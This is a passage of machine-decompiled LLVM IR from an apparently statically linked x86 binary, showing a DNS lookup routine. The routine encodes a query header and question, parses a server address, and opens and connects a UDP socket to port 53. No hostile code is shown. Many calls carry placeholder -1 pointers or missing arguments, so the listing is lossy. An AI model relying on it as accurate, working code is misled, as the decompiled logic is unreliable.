  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8055b32 = call i32 @malloc(i32 512)
  store i32 %v2_8055b32, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8055b32, i32* @ebp, align 4
  %v2_8055b40 = call i32 @malloc(i32 1025)
  store i32 %v2_8055b40, i32* %eax.global-to-local, align 4
  %v12_8055b49 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8055b4c = icmp eq i32 %v2_8055b32, 0
  br i1 %v1_8055b4c, label %dec_label_pc_80561c5, label %dec_label_pc_8055b54

dec_label_pc_8055b54:                             ; preds = %entry
  %v1_8055b54 = icmp eq i32 %v2_8055b40, 0
  br i1 %v1_8055b54, label %dec_label_pc_80561c5, label %dec_label_pc_8055b5c

dec_label_pc_8055b5c:                             ; preds = %dec_label_pc_8055b54
  %v5_8055b5c = icmp eq i32 %arg2, 0
  br i1 %v5_8055b5c, label %dec_label_pc_80561c5, label %dec_label_pc_8055b6a

dec_label_pc_8055b6a:                             ; preds = %dec_label_pc_8055b5c
  %v4_8055b6a = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055b6a, i32* %eax.global-to-local, align 4
  %v2_8055b71 = load i8, i8* %arg1, align 1
  %v3_8055b71 = icmp eq i8 %v2_8055b71, 0
  br i1 %v3_8055b71, label %dec_label_pc_80561c5, label %dec_label_pc_8055b7a

dec_label_pc_8055b7a:                             ; preds = %dec_label_pc_8055b6a
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8055b7e = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8055b7e, i32* @eax, align 4
  store i32 %v4_8055b6a, i32* %edx.global-to-local, align 4
  %v2_8055ba1 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8055ba1, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8055ba9 = call i32 @__pthread_return_void(i32 %v2_8055ba1, i32 134563799)
  store i32 %v3_8055ba9, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8061788.558 to i8*), i8** %stack_var_-252, align 4
  %v2_8055bb5 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8061788.558 to i32))
  %v0_8055bba = load i64, i64* @global_var_80617a0.559, align 8
  %v1_8055bba = trunc i64 %v0_8055bba to i32
  %v1_8055bbf = ashr i32 %v1_8055bba, 31
  %v6_8055bc0 = and i64 %v0_8055bba, 4294967295
  %v8_8055bc0 = zext i32 %v1_8055bbf to i64
  %v9_8055bc0 = mul nuw i64 %v8_8055bc0, 4294967296
  %v10_8055bc0 = or i64 %v9_8055bc0, %v6_8055bc0
  %v14_8055bc0 = srem i64 %v10_8055bc0, %tmp33
  %v15_8055bc0 = trunc i64 %v14_8055bc0 to i32
  %v0_8055bc7 = load i16, i16* @global_var_805b4e4.560, align 4
  %v2_8055bd6 = load i8*, i8** %stack_var_-252, align 4
  %v3_8055bd6 = ptrtoint i8* %v2_8055bd6 to i32
  store i32 %v3_8055bd6, i32* @eax, align 4
  store i32 134563799, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8055bdb = call i32 @__pthread_return_void(i32 %v2_8055ba1, i32 1)
  store i32 %v3_8055bdb, i32* %eax.global-to-local, align 4
  %v3_8055c1f = sext i16 %v0_8055bc7 to i32
  %v5_8055d82 = inttoptr i32 %v15_8055bc0 to i8*
  %v1_80561a087 = add i32 %v12_8055b49, 28
  %v2_80561a088 = inttoptr i32 %v1_80561a087 to i32*
  %v3_80561a089 = load i32, i32* %v2_80561a088, align 4
  %tmp119 = icmp ult i32 %v3_80561a089, 3
  br i1 %tmp119, label %dec_label_pc_8055c00, label %dec_label_pc_80561c5

dec_label_pc_8055c00:                             ; preds = %dec_label_pc_8055b7a, %dec_label_pc_80561a0.backedge
  %v0_8055c0792 = phi i32 [ %v0_80561a0.pre, %dec_label_pc_80561a0.backedge ], [ %v12_8055b49, %dec_label_pc_8055b7a ]
  %v1_8055c00 = add i32 %v0_8055c0792, 20
  %v2_8055c00 = inttoptr i32 %v1_8055c00 to i32*
  %v3_8055c00 = load i32, i32* %v2_8055c00, align 4
  %v13_8055c00 = icmp eq i32 %v3_8055c00, -1
  br i1 %v13_8055c00, label %dec_label_pc_8055c00.dec_label_pc_8055c16_crit_edge, label %dec_label_pc_8055c07

dec_label_pc_8055c00.dec_label_pc_8055c16_crit_edge: ; preds = %dec_label_pc_8055c00
  %v0_8055c16.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c16

dec_label_pc_8055c07:                             ; preds = %dec_label_pc_8055c00
  %v3_8055c0a = load i32, i32* %v2_8055c00, align 4
  %v5_8055c0a = add i32 %v0_8055c0792, -16
  %v6_8055c0a = inttoptr i32 %v5_8055c0a to i32*
  store i32 %v3_8055c0a, i32* %v6_8055c0a, align 4
  %v1_8055c0e = call i32 @__libc_close(i32 -1)
  store i32 %v1_8055c0e, i32* %eax.global-to-local, align 4
  %v0_8055c13 = load i32, i32* @esp, align 4
  %v1_8055c13 = add i32 %v0_8055c13, 16
  br label %dec_label_pc_8055c16

dec_label_pc_8055c16:                             ; preds = %dec_label_pc_8055c00.dec_label_pc_8055c16_crit_edge, %dec_label_pc_8055c07
  %v1_8055c16 = phi i32 [ %v0_8055c0792, %dec_label_pc_8055c00.dec_label_pc_8055c16_crit_edge ], [ %v1_8055c13, %dec_label_pc_8055c07 ]
  %v0_8055c16 = phi i32 [ %v0_8055c16.pre, %dec_label_pc_8055c00.dec_label_pc_8055c16_crit_edge ], [ %v1_8055c0e, %dec_label_pc_8055c07 ]
  %v2_8055c16 = add i32 %v1_8055c16, -4
  %v3_8055c16 = inttoptr i32 %v2_8055c16 to i32*
  store i32 %v0_8055c16, i32* %v3_8055c16, align 4
  %v1_8055c17 = add i32 %v1_8055c16, -8
  %v2_8055c17 = inttoptr i32 %v1_8055c17 to i32*
  store i32 512, i32* %v2_8055c17, align 4
  %v1_8055c1c = add i32 %v1_8055c16, -12
  %v2_8055c1c = inttoptr i32 %v1_8055c1c to i32*
  store i32 0, i32* %v2_8055c1c, align 4
  %v2_8055c1e = add i32 %v1_8055c16, -16
  %v3_8055c1e = inttoptr i32 %v2_8055c1e to i32*
  store i32 %v2_8055b32, i32* %v3_8055c1e, align 4
  %v5_8055c1f = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055bc0, i32 %v3_8055c1f)
  store i32 %v5_8055c1f, i32* %eax.global-to-local, align 4
  %v0_8055c24 = load i32, i32* @esp, align 4
  %v1_8055c27 = add i32 %v0_8055c24, 8
  %v2_8055c27 = inttoptr i32 %v1_8055c27 to i32*
  store i32 48, i32* %v2_8055c27, align 4
  %v1_8055c29 = add i32 %v0_8055c24, 4
  %v2_8055c29 = inttoptr i32 %v1_8055c29 to i32*
  store i32 0, i32* %v2_8055c29, align 4
  %v1_8055c2b = add i32 %v0_8055c24, 84
  store i32 %v1_8055c2b, i32* @ebx, align 4
  %v3_8055c2f = inttoptr i32 %v0_8055c24 to i32*
  store i32 %v1_8055c2b, i32* %v3_8055c2f, align 4
  %v5_8055c30 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055bc0, i32 %v3_8055c1f)
  store i32 %v5_8055c30, i32* %eax.global-to-local, align 4
  %v0_8055c35 = load i32, i32* @esp, align 4
  %v1_8055c35 = add i32 %v0_8055c35, 60
  %v2_8055c35 = inttoptr i32 %v1_8055c35 to i32*
  %v3_8055c35 = load i32, i32* %v2_8055c35, align 4
  store i32 %v3_8055c35, i32* %eax.global-to-local, align 4
  %v1_8055c39 = add i32 %v0_8055c35, 116
  %v2_8055c39 = inttoptr i32 %v1_8055c39 to i32*
  store i32 1, i32* %v2_8055c39, align 4
  %v0_8055c41 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055c41 = add i32 %v0_8055c41, 1
  %v0_8055c42 = load i32, i32* @esp, align 4
  %v1_8055c42 = add i32 %v0_8055c42, 104
  %v2_8055c42 = inttoptr i32 %v1_8055c42 to i32*
  store i32 1, i32* %v2_8055c42, align 4
  %v1_8055c4a = urem i32 %v1_8055c41, 65536
  store i32 %v1_8055c4a, i32* %eax.global-to-local, align 4
  %v1_8055c4f = load i32, i32* @esp, align 4
  %v2_8055c4f = add i32 %v1_8055c4f, 60
  %v3_8055c4f = inttoptr i32 %v2_8055c4f to i32*
  store i32 %v1_8055c4a, i32* %v3_8055c4f, align 4
  %v0_8055c53 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055c53 = load i32, i32* @esp, align 4
  %v2_8055c53 = add i32 %v1_8055c53, 84
  %v3_8055c53 = inttoptr i32 %v2_8055c53 to i32*
  store i32 %v0_8055c53, i32* %v3_8055c53, align 4
  %v0_8055c57 = load i32, i32* @esp, align 4
  %v1_8055c5a = add i32 %v0_8055c57, 8
  %v2_8055c5a = inttoptr i32 %v1_8055c5a to i32*
  store i32 512, i32* %v2_8055c5a, align 4
  %v2_8055c5f = add i32 %v0_8055c57, 4
  %v3_8055c5f = inttoptr i32 %v2_8055c5f to i32*
  store i32 %v2_8055b32, i32* %v3_8055c5f, align 4
  %v0_8055c60 = load i32, i32* @ebx, align 4
  %v3_8055c60 = inttoptr i32 %v0_8055c57 to i32*
  store i32 %v0_8055c60, i32* %v3_8055c60, align 4
  %v0_8055c61 = call i32 @__encode_header()
  store i32 %v0_8055c61, i32* %eax.global-to-local, align 4
  %v0_8055c66 = load i32, i32* @esp, align 4
  store i32 %v0_8055c61, i32* @ebx, align 4
  %v2_8055c6b = icmp slt i32 %v0_8055c61, 0
  br i1 %v2_8055c6b, label %dec_label_pc_80561c5, label %dec_label_pc_8055c73

dec_label_pc_8055c73:                             ; preds = %dec_label_pc_8055c16
  %v2_8055c73 = add i32 %v0_8055c66, 12
  %v3_8055c73 = inttoptr i32 %v2_8055c73 to i32*
  store i32 %v0_8055c61, i32* %v3_8055c73, align 4
  %v1_8055c74 = add i32 %v0_8055c66, 8
  %v2_8055c74 = inttoptr i32 %v1_8055c74 to i32*
  store i32 1025, i32* %v2_8055c74, align 4
  %v1_8055c79 = add i32 %v0_8055c66, 256
  %v2_8055c79 = inttoptr i32 %v1_8055c79 to i32*
  %v3_8055c79 = load i32, i32* %v2_8055c79, align 4
  %v5_8055c79 = add i32 %v0_8055c66, 4
  %v6_8055c79 = inttoptr i32 %v5_8055c79 to i32*
  store i32 %v3_8055c79, i32* %v6_8055c79, align 4
  %v1_8055c80 = add i32 %v0_8055c66, 28
  %v2_8055c80 = inttoptr i32 %v1_8055c80 to i32*
  %v3_8055c80 = load i32, i32* %v2_8055c80, align 4
  %v6_8055c80 = inttoptr i32 %v0_8055c66 to i32*
  store i32 %v3_8055c80, i32* %v6_8055c80, align 4
  %v5_8055c84 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055bc0, i32 %v3_8055c1f)
  %v0_8055c89 = load i32, i32* @esp, align 4
  %v1_8055c8c = add i32 %v0_8055c89, 8
  %v2_8055c8c = inttoptr i32 %v1_8055c8c to i32*
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* %v2_8055c8c, align 4
  %v1_8055c91 = add i32 %v0_8055c89, 4
  %v2_8055c91 = inttoptr i32 %v1_8055c91 to i32*
  store i32 134563799, i32* %v2_8055c91, align 4
  %v1_8055c96 = add i32 %v0_8055c89, 200
  store i32 %v1_8055c96, i32* @eax, align 4
  %v3_8055c9d = inttoptr i32 %v0_8055c89 to i32*
  store i32 %v1_8055c96, i32* %v3_8055c9d, align 4
  %v2_8055c9e = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_8055c9e, i32* %eax.global-to-local, align 4
  %v0_8055ca3 = load i32, i32* @esp, align 4
  %v1_8055ca3 = inttoptr i32 %v0_8055ca3 to i32*
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* %v1_8055ca3, align 4
  %v1_8055caa = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055caa, i32* %eax.global-to-local, align 4
  %v0_8055caf = load i32, i32* @esp, align 4
  %v1_8055caf = add i32 %v0_8055caf, 56
  %v2_8055caf = inttoptr i32 %v1_8055caf to i32*
  %v3_8055caf = load i32, i32* %v2_8055caf, align 4
  store i32 %v3_8055caf, i32* %edx.global-to-local, align 4
  %v1_8055cb3 = add i32 %v0_8055caf, 268
  %v2_8055cb3 = inttoptr i32 %v1_8055cb3 to i32*
  %v3_8055cb3 = load i32, i32* %v2_8055cb3, align 4
  store i32 %v3_8055cb3, i32* %eax.global-to-local, align 4
  %v2_8055cba = mul i32 %v3_8055caf, 4
  %v3_8055cba = add i32 %v3_8055cb3, %v2_8055cba
  %v4_8055cba = inttoptr i32 %v3_8055cba to i32*
  %v5_8055cba = load i32, i32* %v4_8055cba, align 4
  store i32 %v5_8055cba, i32* %edx.global-to-local, align 4
  %v2_8055cbd = add i32 %v0_8055caf, 48
  %v3_8055cbd = inttoptr i32 %v2_8055cbd to i32*
  store i32 %v5_8055cba, i32* %v3_8055cbd, align 4
  %v0_8055cc1 = load i32, i32* @esp, align 4
  %v1_8055cc1 = add i32 %v0_8055cc1, 16
  %v1_8055cc4 = add i32 %v0_8055cc1, 52
  %v2_8055cc4 = inttoptr i32 %v1_8055cc4 to i32*
  %v3_8055cc4 = load i32, i32* %v2_8055cc4, align 4
  %v5_8055cc4 = icmp slt i32 %v3_8055cc4, 0
  br i1 %v5_8055cc4, label %dec_label_pc_8055c73.dec_label_pc_8055d0a_crit_edge, label %dec_label_pc_8055ccb

dec_label_pc_8055c73.dec_label_pc_8055d0a_crit_edge: ; preds = %dec_label_pc_8055c73
  %v0_8055d0a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055d0a

dec_label_pc_8055ccb:                             ; preds = %dec_label_pc_8055c73
  store i32 %v3_8055cc4, i32* %eax.global-to-local, align 4
  %v1_8055ccf = load i32, i32* @global_var_8061bd8.561, align 8
  %v2_8055ccf = sub i32 %v3_8055cc4, %v1_8055ccf
  %v8_8055ccf = xor i32 %v1_8055ccf, %v3_8055cc4
  %v9_8055ccf = xor i32 %v2_8055ccf, %v3_8055cc4
  %v10_8055ccf = and i32 %v9_8055ccf, %v8_8055ccf
  %v11_8055ccf = icmp slt i32 %v10_8055ccf, 0
  %v13_8055ccf = icmp slt i32 %v2_8055ccf, 0
  %v2_8055cd5 = icmp eq i1 %v13_8055ccf, %v11_8055ccf
  br i1 %v2_8055cd5, label %dec_label_pc_8055d0a, label %dec_label_pc_8055cd7

dec_label_pc_8055cd7:                             ; preds = %dec_label_pc_8055ccb
  %v2_8055cd7 = add i32 %v0_8055cc1, 12
  %v3_8055cd7 = inttoptr i32 %v2_8055cd7 to i32*
  store i32 %v3_8055cc4, i32* %v3_8055cd7, align 4
  %v1_8055cd8 = add i32 %v0_8055cc1, 8
  %v2_8055cd8 = inttoptr i32 %v1_8055cd8 to i32*
  store i32 1025, i32* %v2_8055cd8, align 4
  %v1_8055cdd = add i32 %v0_8055cc1, 4
  %v2_8055cdd = inttoptr i32 %v1_8055cdd to i32*
  store i32 ptrtoint (i32* @global_var_805aadc.562 to i32), i32* %v2_8055cdd, align 4
  %v1_8055ce2 = add i32 %v0_8055cc1, 28
  %v2_8055ce2 = inttoptr i32 %v1_8055ce2 to i32*
  %v3_8055ce2 = load i32, i32* %v2_8055ce2, align 4
  %v6_8055ce2 = inttoptr i32 %v0_8055cc1 to i32*
  store i32 %v3_8055ce2, i32* %v6_8055ce2, align 4
  %v0_8055ce6 = call i32 @__GI_strncat()
  store i32 %v0_8055ce6, i32* %eax.global-to-local, align 4
  %v0_8055ceb = load i32, i32* @esp, align 4
  %v1_8055cee = add i32 %v0_8055ceb, 8
  %v2_8055cee = inttoptr i32 %v1_8055cee to i32*
  store i32 1025, i32* %v2_8055cee, align 4
  %v1_8055cf3 = add i32 %v0_8055ceb, 52
  %v2_8055cf3 = inttoptr i32 %v1_8055cf3 to i32*
  %v3_8055cf3 = load i32, i32* %v2_8055cf3, align 4
  store i32 %v3_8055cf3, i32* %edx.global-to-local, align 4
  %v1_8055cf7 = mul i32 %v3_8055cf3, 4
  %v2_8055cf7 = add i32 %v1_8055cf7, 134618040
  %v3_8055cf7 = inttoptr i32 %v2_8055cf7 to i32*
  %v4_8055cf7 = load i32, i32* %v3_8055cf7, align 4
  %v6_8055cf7 = add i32 %v0_8055ceb, 4
  %v7_8055cf7 = inttoptr i32 %v6_8055cf7 to i32*
  store i32 %v4_8055cf7, i32* %v7_8055cf7, align 4
  %v1_8055cfe = add i32 %v0_8055ceb, 28
  %v2_8055cfe = inttoptr i32 %v1_8055cfe to i32*
  %v3_8055cfe = load i32, i32* %v2_8055cfe, align 4
  %v6_8055cfe = inttoptr i32 %v0_8055ceb to i32*
  store i32 %v3_8055cfe, i32* %v6_8055cfe, align 4
  %v0_8055d02 = call i32 @__GI_strncat()
  store i32 %v0_8055d02, i32* %eax.global-to-local, align 4
  %v0_8055d07 = load i32, i32* @esp, align 4
  %v1_8055d07 = add i32 %v0_8055d07, 16
  br label %dec_label_pc_8055d0a

dec_label_pc_8055d0a:                             ; preds = %dec_label_pc_8055c73.dec_label_pc_8055d0a_crit_edge, %dec_label_pc_8055ccb, %dec_label_pc_8055cd7
  %v1_8055d0a = phi i32 [ %v1_8055cc1, %dec_label_pc_8055c73.dec_label_pc_8055d0a_crit_edge ], [ %v1_8055cc1, %dec_label_pc_8055ccb ], [ %v1_8055d07, %dec_label_pc_8055cd7 ]
  %v0_8055d0a = phi i32 [ %v0_8055d0a.pre, %dec_label_pc_8055c73.dec_label_pc_8055d0a_crit_edge ], [ %v3_8055cc4, %dec_label_pc_8055ccb ], [ %v0_8055d02, %dec_label_pc_8055cd7 ]
  %v2_8055d0a = add i32 %v1_8055d0a, -4
  %v3_8055d0a = inttoptr i32 %v2_8055d0a to i32*
  store i32 %v0_8055d0a, i32* %v3_8055d0a, align 4
  %v0_8055d0b = load i32, i32* %eax.global-to-local, align 4
  %v2_8055d0b = add i32 %v1_8055d0a, -8
  %v3_8055d0b = inttoptr i32 %v2_8055d0b to i32*
  store i32 %v0_8055d0b, i32* %v3_8055d0b, align 4
  %v1_8055d0c = add i32 %v1_8055d0a, -12
  %v2_8055d0c = inttoptr i32 %v1_8055d0c to i32*
  store i32 1, i32* %v2_8055d0c, align 4
  %v1_8055d0e = add i32 %v1_8055d0a, 184
  store i32 %v1_8055d0e, i32* @eax, align 4
  %v2_8055d15 = add i32 %v1_8055d0a, -16
  %v3_8055d15 = inttoptr i32 %v2_8055d15 to i32*
  store i32 %v1_8055d0e, i32* %v3_8055d15, align 4
  %v2_8055d16 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_8055d16, i32* %eax.global-to-local, align 4
  %v0_8055d1b = load i32, i32* @esp, align 4
  %v1_8055d1b = add i32 %v0_8055d1b, 28
  %v2_8055d1b = inttoptr i32 %v1_8055d1b to i32*
  %v3_8055d1b = load i32, i32* %v2_8055d1b, align 4
  store i32 %v3_8055d1b, i32* %eax.global-to-local, align 4
  %v1_8055d1f = add i32 %v0_8055d1b, 260
  %v2_8055d1f = inttoptr i32 %v1_8055d1f to i32*
  %v3_8055d1f = load i32, i32* %v2_8055d1f, align 4
  store i32 %v3_8055d1f, i32* @edx, align 4
  %v2_8055d26 = add i32 %v0_8055d1b, 216
  %v3_8055d26 = inttoptr i32 %v2_8055d26 to i32*
  store i32 %v3_8055d1b, i32* %v3_8055d26, align 4
  %v0_8055d2d = load i32, i32* @edx, align 4
  %v1_8055d2d = load i32, i32* @esp, align 4
  %v2_8055d2d = add i32 %v1_8055d2d, 220
  %v3_8055d2d = inttoptr i32 %v2_8055d2d to i32*
  store i32 %v0_8055d2d, i32* %v3_8055d2d, align 4
  %v0_8055d34 = load i32, i32* @esp, align 4
  %v1_8055d34 = add i32 %v0_8055d34, 224
  %v2_8055d34 = inttoptr i32 %v1_8055d34 to i32*
  store i32 1, i32* %v2_8055d34, align 4
  %v0_8055d44 = load i32, i32* @esp, align 4
  %v1_8055d47 = load i32, i32* @ebx, align 4
  %v2_8055d47 = sub i32 512, %v1_8055d47
  %v2_8055d49 = add i32 %v0_8055d44, 8
  %v3_8055d49 = inttoptr i32 %v2_8055d49 to i32*
  store i32 %v2_8055d47, i32* %v3_8055d49, align 4
  %v1_8055d4a = load i32, i32* @ebx, align 4
  %v2_8055d4a = add i32 %v1_8055d4a, %v2_8055b32
  %v2_8055d4e = add i32 %v0_8055d44, 4
  %v3_8055d4e = inttoptr i32 %v2_8055d4e to i32*
  store i32 %v2_8055d4a, i32* %v3_8055d4e, align 4
  %v1_8055d4f = add i32 %v0_8055d44, 216
  store i32 %v1_8055d4f, i32* @eax, align 4
  %v3_8055d56 = inttoptr i32 %v0_8055d44 to i32*
  store i32 %v1_8055d4f, i32* %v3_8055d56, align 4
  %v0_8055d57 = call i32 @__encode_question()
  store i32 %v0_8055d57, i32* %eax.global-to-local, align 4
  %v0_8055d5c = load i32, i32* @esp, align 4
  store i32 %v0_8055d57, i32* @esi, align 4
  %v2_8055d61 = icmp slt i32 %v0_8055d57, 0
  br i1 %v2_8055d61, label %dec_label_pc_80561c5, label %dec_label_pc_8055d69

dec_label_pc_8055d69:                             ; preds = %dec_label_pc_8055d0a
  %v1_8055d69 = add i32 %v0_8055d5c, 172
  %v2_8055d69 = inttoptr i32 %v1_8055d69 to i16*
  store i16 2, i16* %v2_8055d69, align 2
  %v1_8055d73 = load i32, i32* @esp, align 4
  %v2_8055d73 = add i32 %v1_8055d73, -4
  %v3_8055d73 = inttoptr i32 %v2_8055d73 to i32*
  store i32 %v0_8055d57, i32* %v3_8055d73, align 4
  %v1_8055d74 = add i32 %v1_8055d73, 164
  store i32 %v1_8055d74, i32* %eax.global-to-local, align 4
  %v2_8055d7b = add i32 %v1_8055d73, -8
  %v3_8055d7b = inttoptr i32 %v2_8055d7b to i32*
  store i32 %v1_8055d74, i32* %v3_8055d7b, align 4
  %v1_8055d7c = add i32 %v1_8055d73, 32
  %v2_8055d7c = inttoptr i32 %v1_8055d7c to i32*
  %v3_8055d7c = load i32, i32* %v2_8055d7c, align 4
  %v5_8055d7c = add i32 %v1_8055d73, -12
  %v6_8055d7c = inttoptr i32 %v5_8055d7c to i32*
  store i32 %v3_8055d7c, i32* %v6_8055d7c, align 4
  %v1_8055d80 = add i32 %v1_8055d73, -16
  %v2_8055d80 = inttoptr i32 %v1_8055d80 to i32*
  store i32 10, i32* %v2_8055d80, align 4
  %v6_8055d82 = call i32 @inet_pton(i32 -1, i8* %v5_8055d82, i32 %v3_8055c1f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8055d82, i32* %eax.global-to-local, align 4
  %v0_8055d87 = load i32, i32* @esp, align 4
  %v1_8055d87 = add i32 %v0_8055d87, 16
  %tmp47 = icmp slt i32 %v6_8055d82, 1
  br i1 %tmp47, label %dec_label_pc_8055d98, label %dec_label_pc_8055d8e

dec_label_pc_8055d8e:                             ; preds = %dec_label_pc_8055d69
  %v1_8055d8e = add i32 %v0_8055d87, 172
  %v2_8055d8e = inttoptr i32 %v1_8055d8e to i16*
  store i16 10, i16* %v2_8055d8e, align 2
  %v0_8055d98.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055d98

dec_label_pc_8055d98:                             ; preds = %dec_label_pc_8055d69, %dec_label_pc_8055d8e
  %v0_8055daf = phi i32 [ %v1_8055d87, %dec_label_pc_8055d69 ], [ %v0_8055d98.pre, %dec_label_pc_8055d8e ]
  %v1_8055d98 = add i32 %v0_8055daf, 156
  %v2_8055d98 = inttoptr i32 %v1_8055d98 to i16*
  %v3_8055d98 = load i16, i16* %v2_8055d98, align 2
  %v12_8055d98 = icmp eq i16 %v3_8055d98, 10
  %v1_8055da1 = icmp eq i1 %v12_8055d98, false
  %v1_8055daf = add i32 %v0_8055daf, 158
  %v2_8055daf = inttoptr i32 %v1_8055daf to i16*
  store i16 13568, i16* %v2_8055daf, align 2
  %v0_8055db9 = load i32, i32* @esp, align 4
  br i1 %v1_8055da1, label %dec_label_pc_8055daf, label %dec_label_pc_8055dcf

dec_label_pc_8055daf:                             ; preds = %dec_label_pc_8055d98
  %v1_8055dbc = add i32 %v0_8055db9, 32
  %v2_8055dbc = inttoptr i32 %v1_8055dbc to i32*
  %v3_8055dbc = load i32, i32* %v2_8055dbc, align 4
  %v5_8055dbc = add i32 %v0_8055db9, -16
  %v6_8055dbc = inttoptr i32 %v5_8055dbc to i32*
  store i32 %v3_8055dbc, i32* %v6_8055dbc, align 4
  %v1_8055dc0 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8055dc0, i32* %eax.global-to-local, align 4
  %v1_8055dc5 = load i32, i32* @esp, align 4
  %v2_8055dc5 = add i32 %v1_8055dc5, 176
  %v3_8055dc5 = inttoptr i32 %v2_8055dc5 to i32*
  store i32 %v1_8055dc0, i32* %v3_8055dc5, align 4
  %v0_8055dcc = load i32, i32* @esp, align 4
  %v1_8055dcc = add i32 %v0_8055dcc, 16
  br label %dec_label_pc_8055dcf

dec_label_pc_8055dcf:                             ; preds = %dec_label_pc_8055d98, %dec_label_pc_8055daf
  %v1_8055dcf = phi i32 [ %v1_8055dcc, %dec_label_pc_8055daf ], [ %v0_8055db9, %dec_label_pc_8055d98 ]
  %v0_8055dcf = load i32, i32* @ecx, align 4
  %v2_8055dcf = add i32 %v1_8055dcf, -4
  %v3_8055dcf = inttoptr i32 %v2_8055dcf to i32*
  store i32 %v0_8055dcf, i32* %v3_8055dcf, align 4
  %v1_8055dd0 = add i32 %v1_8055dcf, -8
  %v2_8055dd0 = inttoptr i32 %v1_8055dd0 to i32*
  store i32 17, i32* %v2_8055dd0, align 4
  %v1_8055dd2 = add i32 %v1_8055dcf, -12
  %v2_8055dd2 = inttoptr i32 %v1_8055dd2 to i32*
  store i32 2, i32* %v2_8055dd2, align 4
  %v1_8055dd4 = add i32 %v1_8055dcf, 156
  %v2_8055dd4 = inttoptr i32 %v1_8055dd4 to i16*
  %v3_8055dd4 = load i16, i16* %v2_8055dd4, align 2
  %v4_8055dd4 = zext i16 %v3_8055dd4 to i32
  store i32 %v4_8055dd4, i32* %eax.global-to-local, align 4
  %v2_8055ddc = add i32 %v1_8055dcf, -16
  %v3_8055ddc = inttoptr i32 %v2_8055ddc to i32*
  store i32 %v4_8055dd4, i32* %v3_8055ddc, align 4
  %v4_8055ddd = call i32 @socket(i32 -1, i32 %v15_8055bc0, i32 %v3_8055c1f)
  store i32 %v4_8055ddd, i32* %eax.global-to-local, align 4
  %v1_8055de2 = load i32, i32* @esp, align 4
  %v2_8055de2 = add i32 %v1_8055de2, 36
  %v3_8055de2 = inttoptr i32 %v2_8055de2 to i32*
  store i32 %v4_8055ddd, i32* %v3_8055de2, align 4
  %v0_8055de6 = load i32, i32* @esp, align 4
  %v1_8055de6 = add i32 %v0_8055de6, 16
  %v0_8055de9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055de9 = icmp slt i32 %v0_8055de9, 0
  br i1 %v2_8055de9, label %dec_label_pc_8055e16, label %dec_label_pc_8055ded

dec_label_pc_8055ded:                             ; preds = %dec_label_pc_8055dcf
  %v1_8055ded = add i32 %v0_8055de6, 172
  store i32 %v1_8055ded, i32* %eax.global-to-local, align 4
  %v0_8055df4 = load i32, i32* @edx, align 4
  %v2_8055df4 = add i32 %v0_8055de6, 12
  %v3_8055df4 = inttoptr i32 %v2_8055df4 to i32*
  store i32 %v0_8055df4, i32* %v3_8055df4, align 4
  %v1_8055df5 = add i32 %v0_8055de6, 8
  %v2_8055df5 = inttoptr i32 %v1_8055df5 to i32*
  store i32 28, i32* %v2_8055df5, align 4
  %v0_8055df7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055df7 = add i32 %v0_8055de6, 4
  %v3_8055df7 = inttoptr i32 %v2_8055df7 to i32*
  store i32 %v0_8055df7, i32* %v3_8055df7, align 4
  %v1_8055df8 = add i32 %v0_8055de6, 36
  %v2_8055df8 = inttoptr i32 %v1_8055df8 to i32*
  %v3_8055df8 = load i32, i32* %v2_8055df8, align 4
  %v6_8055df8 = inttoptr i32 %v0_8055de6 to i32*
  store i32 %v3_8055df8, i32* %v6_8055df8, align 4
  %v4_8055dfc = call i32 @__libc_connect(i32 -1, i32 %v15_8055bc0, i32 %v3_8055c1f)
  store i32 %v4_8055dfc, i32* %eax.global-to-local, align 4
  %v0_8055e01 = load i32, i32* @esp, align 4
  %v2_8055e04 = icmp slt i32 %v4_8055dfc, 0
  %v1_8055e06 = icmp eq i1 %v2_8055e04, false
  br i1 %v1_8055e06, label %dec_label_pc_8055e1f, label %dec_label_pc_8055e08

dec_label_pc_8055e08:                             ; preds = %dec_label_pc_8055ded
  %v1_8055e08 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8055e08, i32* %eax.global-to-local, align 4
  %v1_8055e0d = inttoptr i32 %v1_8055e08 to i32*
  %v2_8055e0d = load i32, i32* %v1_8055e0d, align 4
  %v11_8055e0d = icmp eq i32 %v2_8055e0d, 101
  %v0_805617f.pre = load i32, i32* @esp, align 4
  br i1 %v11_8055e0d, label %dec_label_pc_805617f, label %dec_label_pc_8055e16

dec_label_pc_8055e16:                             ; preds = %dec_label_pc_8055e08, %dec_label_pc_8055dcf
